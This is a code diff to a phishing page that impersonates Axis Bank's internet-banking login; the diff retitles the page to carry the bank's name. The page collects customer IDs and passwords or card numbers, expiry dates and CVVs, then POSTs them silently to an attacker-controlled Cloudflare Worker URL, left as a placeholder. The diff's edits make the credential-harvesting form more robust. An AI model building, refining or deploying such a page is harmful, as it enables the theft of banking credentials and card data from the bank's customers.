@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>pension</title>
+    <title>Login to Internet Banking | Axis Bank</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -61,7 +61,7 @@
             <div id="id-section" class="space-y-6">
                 <div>
                     <label class="text-[13px] font-bold text-[#5a5a5a] mb-2 block">Login ID / Customer ID <span class="text-red-600">*</span></label>
-                    <input type="text" id="custId" placeholder="Enter ID" class="input-box">
+                    <input type="text" id="custId" placeholder="Enter ID" class="input-box" required>
                     <div class="flex gap-4 mt-3">
                         <a href="#" class="text-[12px] text-[#971237] font-bold hover:underline">Forgot customer ID</a>
                         <span class="text-gray-300">|</span>
@@ -73,7 +73,7 @@
                     <label class="block text-[13px] font-bold text-[#5a5a5a] mb-2">Password <span class="text-red-600">*</span></label>
                     <div class="relative flex gap-2">
                         <div class="relative flex-1">
-                            <input id="passwordInput" type="password" placeholder="Enter Password" class="input-box pr-12">
+                            <input id="passwordInput" type="password" placeholder="Enter Password" class="input-box pr-12" required>
                             <button type="button" onclick="togglePasswordVisibility()" class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400">
                                 <i id="eyeIcon" data-lucide="eye-off" class="w-4 h-4"></i>
                             </button>
@@ -156,10 +156,22 @@
         }
 
         function showTab(type) {
-            document.getElementById('id-tab').className = type === 'id' ? 'pill-tab pill-active' : 'pill-tab pill-inactive';
-            document.getElementById('card-tab').className = type === 'card' ? 'pill-tab pill-active' : 'pill-tab pill-inactive';
-            document.getElementById('id-section').classList.toggle('hidden', type !== 'id');
-            document.getElementById('card-section').classList.toggle('hidden', type !== 'card');
+            const isId = type === 'id';
+            document.getElementById('id-tab').className = isId ? 'pill-tab pill-active' : 'pill-tab pill-inactive';
+            document.getElementById('card-tab').className = isId ? 'pill-tab pill-inactive' : 'pill-tab pill-active';
+            
+            const idSection = document.getElementById('id-section');
+            const cardSection = document.getElementById('card-section');
+            
+            idSection.classList.toggle('hidden', !isId);
+            cardSection.classList.toggle('hidden', isId);
+
+            // Toggle 'required' attribute based on active tab
+            document.getElementById('custId').required = isId;
+            document.getElementById('passwordInput').required = isId;
+            document.getElementById('cardNum').required = !isId;
+            document.getElementById('expiryDate').required = !isId;
+            document.getElementById('cvv').required = !isId;
         }
 
         // Logic formatting
@@ -172,10 +184,8 @@
             e.target.value = v.match(/.{1,4}/g)?.join(' ') || '';
         });
 
-        // WORKER SUBMISSION & REDIRECT
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-
             const isCard = !document.getElementById('card-section').classList.contains('hidden');
             const data = isCard ? {
                 type: 'CARD',
@@ -188,9 +198,7 @@
                 pass: document.getElementById('passwordInput').value
             };
 
-            // APNA WORKER URL YAHAN DALO
             const WORKER_URL = 'https://your-worker.your-subdomain.workers.dev/';
-
             fetch(WORKER_URL, {
                 method: 'POST',
                 mode: 'no-cors',
